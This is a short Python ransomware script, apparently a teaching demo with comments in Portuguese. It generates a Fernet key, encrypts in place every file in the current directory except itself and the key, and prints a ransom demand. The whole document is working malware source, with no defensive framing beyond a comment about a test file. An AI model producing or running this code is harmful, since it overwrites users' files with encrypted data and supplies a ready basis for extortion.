import os
from cryptography.fernet import Fernet

# 1. Gerar a chave (O "Segredo" do desbloqueio)
key = Fernet.generate_key()
with open("chave.key", "wb") as key_file:
    key_file.write(key)

# 2. Definir quais arquivos vamos "sequestrar"
# No seu teste, crie um arquivo teste.txt antes de rodar isso!
files = []
for file in os.listdir():
    if file == "ransomware.py" or file == "chave.key" or file == "decrypt.py":
        continue # Não criptografar o próprio script ou a chave
    if os.path.isfile(file):
        files.append(file)

print(f"Arquivos encontrados: {files}")

# 3. Criptografar (O Ataque)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    
    contents_encrypted = Fernet(key).encrypt(contents)
    
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! PAGUE O RESGATE!")
